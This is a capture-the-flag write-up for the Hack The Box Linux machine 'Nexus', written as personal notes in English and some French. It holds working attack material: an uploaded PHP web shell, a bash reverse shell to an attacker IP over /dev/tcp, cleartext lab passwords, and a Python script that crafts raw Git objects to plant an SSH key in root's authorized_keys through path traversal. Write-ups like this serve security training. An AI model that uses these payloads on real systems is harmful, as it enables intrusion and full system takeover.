---
type: writeup
platform: HTB
name: Nexus
os: Linux
difficulty: Easy
status: completed
tags: [htb, linux, easy, web, git, rce, path-traversal, credential-reuse, privesc]
techniques:
  - Vhost fuzzing
  - Git commit history secret leakage
  - CVE-2026-38526 (unrestricted file upload → RCE)
  - Password reuse / credential reuse
  - Systemd timer/service enumeration
  - Path traversal via unsanitized os.path.join()
  - Raw Git object crafting (bypassing client-side path validation)
  - SSH key-based privilege escalation
tools:
  - nmap
  - ffuf
  - Burp Suite
  - curl
  - git
  - Python 3
  - ssh-keygen
  - nc (netcat)
date: 2026-09-20
---
## Summary

Nexus is an easy-difficulty Linux machine featuring an exposed Gitea repository that leaks database credentials through commit history, a Krayin CRM instance vulnerable to CVE-2026-38526 (unrestricted file upload via TinyMCE), and a custom Gitea template sync service vulnerable to directory traversal through unsanitized `os.path.join()` usage.

**Attack Chain:**
1. Vhost enumeration reveals `git.nexus.htb` and `billing.nexus.htb`
2. Gitea commit history leaks database credentials
3. Krayin CRM file upload (CVE-2026-38526) → shell as `www-data`
4. `.env` credentials → SSH as `jones`
5. Gitea template sync directory traversal → root

**Flags:**
- User: `/home/jones/user.txt`
- Root: `/root/root.txt`
## Enumeration

### Nmap Scan
![[Attachments/Screenshot 2026-09-20 203303.png]]
```bash
nmap -sCV 10.129.112.245
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

Only SSH and HTTP are exposed. HTTP redirects to `nexus.htb`.

```bash
sudo sh -c 'echo "10.129.112.245 nexus.htb" >> /etc/hosts'
```

### Web Enumeration
`nexus.htb` hosts a fictional government energy authority site ("Nexus Energy Authority"). The **Careers** section lists an open role, *Operations Specialist – Customer Platforms*, which leaks two email addresses:
- `careers@nexus.htb`
- `j.matthew@nexus.htb` (hiring manager)

These will matter later for credential reuse.

### Vhost Fuzzing
![[Attachments/Screenshot 2026-09-20 204121.png]]
```bash
ffuf -u http://nexus.htb -H 'Host: FUZZ.nexus.htb' \
  -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

```
git      [Status: 200, Size: 14474, Words: 1195, Lines: 242]
billing  [Status: 302, Size: 390,   Words: 60,   Lines: 12]
```

Two new vhosts found: `git.nexus.htb` and `billing.nexus.htb`.

```bash
sudo sh -c 'echo "10.129.112.245 git.nexus.htb billing.nexus.htb" >> /etc/hosts'
```

### Gitea Enumeration (git.nexus.htb)
![[Attachments/Screenshot 2026-09-20 204149 1.png]]
Gitea v1.26.0, anonymous **Explore** access is enabled — no login required to browse public repos and users.

- **Users found:** `jones`, `admin`
- **Public repo found:** `admin/krayin-docker-setup`
![[Attachments/Screenshot 2026-09-20 204208.png]]

The repo contains three files: `.env`, `docker-compose.yml`, `documents`.
![[Attachments/Screenshot 2026-09-20 204341 1.png]]

**`.env`:**
- `APP_URL=http://billing.nexus.htb` — confirms the CRM's vhost
- `DB_PASSWORD=` — empty in the latest version (interesting: worth checking commit history)

**`docker-compose.yml`:**
- Confirms the stack: `webkul/krayin:latest` (Krayin CRM) + MySQL 8.0
- `APP_DEBUG: "true"` — flags that debug mode is likely enabled on the live app 
### Credential Leak via Commit History
![[Attachments/Screenshot 2026-09-20 204539.png]]
The latest commit to `admin/krayin-docker-setup` has `DB_PASSWORD=` empty, but browsing the **commit history** reveals an earlier commit where the password was still present:

```
commit 1615c465b74e5d7ad3162873382dd8b3869ca892
+ DB_PASSWORD=N27xh!!2ucY04
```

> [!tip] Toujours vérifier l'historique des commits
> Un secret retiré dans le dernier commit reste visible dans l'historique Git tant que le repo n'a pas été réécrit (`git filter-repo`, BFG, etc.). C'est une source fréquente de fuite de credentials.

See: [[Git Commit History Leakage]]

### Krayin CRM Login
![[Attachments/Screenshot 2026-09-20 204555.png]]
Using the leaked password with the hiring manager's email found earlier on the main site:
- **Email:** `j.matthew@nexus.htb`
- **Password:** `N27xh!!2ucY04`

Login succeeds → redirected to `billing.nexus.htb/admin/dashboard`.

### Version Fingerprinting
![[Attachments/Screenshot 2026-09-20 204816.png]]
The admin panel footer / account dropdown discloses:
```
Version: 2.2.0
```

Searching `krayin version 2.2.0 cve` surfaces several critical vulnerabilities affecting Krayin CRM v2.2.0, most notably:

| CVE | Type | CVSS |
|---|---|---|
| **CVE-2026-38526** | Unrestricted PHP file upload via `/admin/tinymce/upload` → RCE | 9.9 (Critical) |
| CVE-2026-38529 | BOLA on password reset (`Settings/UserController.php`) | 8.8 (High) |
| CVE-2026-38528 | SQL Injection via `rotten_lead` param (`/Lead/LeadDataGrid.php`) | 8.5 (High) |
| CVE-2026-38527 | SSRF | 8.5 (High) |

CVE-2026-38526 is the target: an authenticated arbitrary file upload in the TinyMCE upload endpoint, with no extension allowlist, saving files in a directory directly accessible over HTTP.
![[Attachments/Screenshot 2026-09-20 204857.png]]
### First Attempt — CSRF Token Pitfall

Sending a raw `GET`/`POST` to `/admin/tinymce/upload` directly in Burp Repeater (copy-pasted from an old captured request) initially failed:

- A `GET` request returned **405 Method Not Allowed** (Laravel debug bar confirms only `POST` is supported).
- A `POST` replay returned **419 Page Expired** — Laravel's CSRF protection rejected the request.

> [!warning] CSRF token expiration
> Laravel's `XSRF-TOKEN` / `_token` values are tied to the session and expire quickly. A request captured earlier (even a few minutes prior) will fail with `419` once the token or session has rotated. **Always capture a fresh request directly from the browser** (via Burp's proxy, live) right before replaying it in Repeater, rather than reusing an old saved request.

The session cookie itself is a Laravel-encrypted, signed value (`iv` / `value` / `mac` JSON structure, base64+URL-decoded) — confirming this is standard Laravel session encryption, not something to tamper with directly.
### Successful Upload (Fresh Token)
![](file:///C:/Users/Hp%20Victus/Pictures/Screenshots/Screenshot%202026-09-20%20213331.png)
Capturing a **live** request directly from the browser (fresh CSRF token + session) and forwarding it to Repeater succeeds:
![](file:///C:/Users/Hp%20Victus/Pictures/Screenshots/Screenshot%202026-09-20%20213517.png)
```http
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
...
Content-Type: multipart/form-data; boundary=--boundary
Content-Length: 159

----boundary
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
----boundary--
```

Response confirms success and discloses the file location:
```json
{
    "location": "http:\/\/billing.nexus.htb\/storage\/tinymce\/dbc615ddfed31ce8a8b7b447faf61bb0.php"
}
```

See: [[Unrestricted File Upload RCE]]

### Confirming RCE
```http
GET /storage/tinymce/dbc615ddfed31ce8a8b7b447faf61bb0.php?cmd=id HTTP/1.1
Host: billing.nexus.htb
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell — First Attempts Fail
Sending the reverse shell payload unencoded through Burp's URL bar directly breaks the HTTP request line (spaces/special chars aren't valid raw in a request line):

```
GET /storage/tinymce/....php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.118/4444 0>&1' HTTP/1.1
→ 400 Bad Request
```

> [!warning] Toujours URL-encoder le payload dans la ligne de requête
> Les espaces et caractères spéciaux (`&`, `>`, `'`) cassent la syntaxe HTTP brute si on les laisse tels quels dans Burp Repeater. Sélectionner la valeur du paramètre et faire **Ctrl+U** (URL-encode) avant d'envoyer.

Même après un premier encodage partiel, une syntaxe `bash -c '...'` trop complexe casse encore la requête. La version simplifiée sans `-c` et sans guillemets imbriqués fonctionne :

```
GET /storage/tinymce/dbc615ddfed31ce8a8b7b447faf61bb0.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/10.10.16.118/4444%200%3E%261 HTTP/1.1
```

Listener catches the shell as `www-data`.
![](file:///C:/Users/Hp%20Victus/Pictures/Screenshots/Screenshot%202026-09-20%20214025.png)

### TTY Upgrade
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# type: reset (terminal type: screen)
```

### Post-Exploitation — Reading Krayin's .env
```bash
www-data@nexus:~/krayin$ cat .env
```

The **real** `.env` on disk (different from the one committed to Gitea) reveals the actual DB password:
```
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
DB_PASSWORD=y27xb3ha!!74GbR
```

### SSH as jones
Password reuse — `y27xb3ha!!74GbR` also works for the `jones` SSH account. See: [[Credential Reuse]]

```bash
ssh jones@nexus.htb
```

**User flag:** `/home/jones/user.txt`
### CVE Details — CVE-2026-38526
```
Summary: An authenticated arbitrary file upload vulnerability exists in Krayin CRM
(version 2.2.x) by Webkul. The TinyMCE media upload endpoint /admin/tinymce/upload
accepts PHP files without validating the uploaded file type, enabling an
authenticated attacker to upload a malicious PHP shell and achieve RCE.

CVE ID:               CVE-2026-38526
Vulnerability Type:   Unrestricted File Upload leading to RCE (CWE-434)
Attack Type:          Remote / Network
Authentication:       Required (low-privilege authenticated user)
CVSS v3.1 Score:      9.9 (Critical)
CVSS v3.1 Vector:     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
```

---

## Privilege Escalation — jones to root

### Discovering the Template Sync Service
```bash
jones@nexus:~$ systemctl list-timers | grep gitea
jones@nexus:~$ cat /etc/systemd/system/gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

The service **runs as root**, triggered by a systemd timer (`gitea-template-sync.timer`).

### Analyzing the Sync Script
```bash
jones@nexus:/etc/gitea$ cat template-sync.py
```

Key logic:
- Reads a Gitea API token from `/etc/gitea/template-sync.conf` (or `/opt/forge/app/.env`)
- Queries the Gitea API for repositories marked as **template**
- For each template repo, runs `git ls-tree -r HEAD` on the bare repository and, for every entry, writes it to:
  ```python
  target = os.path.join(stage_path, filepath)
  ```
  where `stage_path = /home/git/template-staging/<owner>/<repo>/`

> [!bug] Vulnerability — Path Traversal via unsanitized `os.path.join()`
> `filepath` comes directly from `git ls-tree` output, with no sanitization. `os.path.join()` in Python does not block `..` components — a filename like `../../../../root/.ssh/authorized_keys` inside the tracked tree causes the script (running as **root**) to write the file wherever the traversal points, escaping the intended staging directory entirely.

See: [[Path Traversal]] | [[Raw Git Object Crafting]]

### Exploitation Plan
The staging path `/home/git/template-staging/jones/<repo>/` sits **4 directories deep** from `/`. Reaching `/root/.ssh/authorized_keys` requires the matching number of `../` segments.

Git's normal client-side validation (`git add`, `git mktree`) refuses to track paths containing `..`. To bypass this, raw Git objects are written directly to `.git/objects/`, skipping that validation entirely.

**Step 1 — Generate an SSH key pair:**
```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
```

**Step 2 — Create a Gitea repo and mark it as a template:**
Created via the Gitea web UI (or API) as `jones/pwn1`, with the **Template** flag enabled (visible in the repo badge).

**Step 3 — Craft the traversal payload with raw Git objects:**
A Python script (`build.py`) manually constructs Git blob/tree/commit objects and writes them straight into `.git/objects/`, bypassing path validation, then points `refs/heads/main` at the new commit — creating a tree where `git ls-tree -r` reports:
```
100644 blob <hash>    README.md
100644 blob <hash>    ../../../../root/.ssh/authorized_keys
```

**Step 4 — Push:**
```bash
git push 'http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/pwn1.git' main --force
```

Confirmed on Gitea: the `pwn1` repo shows the **Template** badge and the traversal folder `../../../../root/.ssh/` in its file tree.
### Step 3 (detail) — `build.py`
```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

r = subprocess.run(["cat", "/tmp/rootkey.pub"], capture_output=True, text=True)
key = r.stdout.strip() + "\n"

blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")
for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")
root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")

ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

> [!note] Piège rencontré : `SyntaxError: invalid non-printable character U+00A0`
> Le script copié-collé depuis une source externe contenait des espaces insécables (U+00A0) invisibles, cassant la syntaxe Python. Correction :
> ```bash
> sed -i 's/\xc2\xa0/ /g' build.py
> ```

Run:
```bash
python3 build.py
# Done: 8ef7e94a03f68b2e988787dd09f825cb606fd2d1
```

### Waiting for Sync
The timer fires periodically (≈1 minute). Monitored via:
```bash
tail -f /var/log/template-sync.log
```

Once the log shows:
```
synced: ../../../../root/.ssh/authorized_keys
```

...the public key has been written into `/root/.ssh/authorized_keys` by the root-owned sync service.

### Root Shell
```bash
ssh -i /tmp/rootkey root@nexus.htb
```

**Root flag:** `/root/root.txt`

---


## Key Takeaways

| Lesson | Detail |
|---|---|
| **Check Git commit history** | Removed secrets persist in earlier commits even after being scrubbed from the latest one |
| **`os.path.join()` is not a sandbox** | It does not strip `..` components — untrusted path segments must be validated explicitly |
| **Raw Git objects bypass client-side validation** | Writing directly to `.git/objects/` and updating refs skips the path checks normally enforced by `git add`/`git mktree` |
| **URL-encode payloads in raw HTTP requests** | Spaces and shell metacharacters break the HTTP request line if sent unencoded |
| **CSRF tokens expire fast** | Always capture a fresh request from the live browser session before replaying in Repeater |

## Related
- [[Path Traversal]]
- [[Unrestricted File Upload RCE]]
- [[Credential Reuse]]
- [[Vhost Fuzzing]]
- [[Git Commit History Leakage]]
- [[Raw Git Object Crafting]]
- [[nmap]]
- [[ffuf]]
- [[curl]]
- [[Burp Suite]]
- [[git]]
- [[Pentest Recon Cheatsheet]]
- [[Pentest Web Cheatsheet]]
- [[Pentest Privesc Cheatsheet]]
- [[Machines Index]]
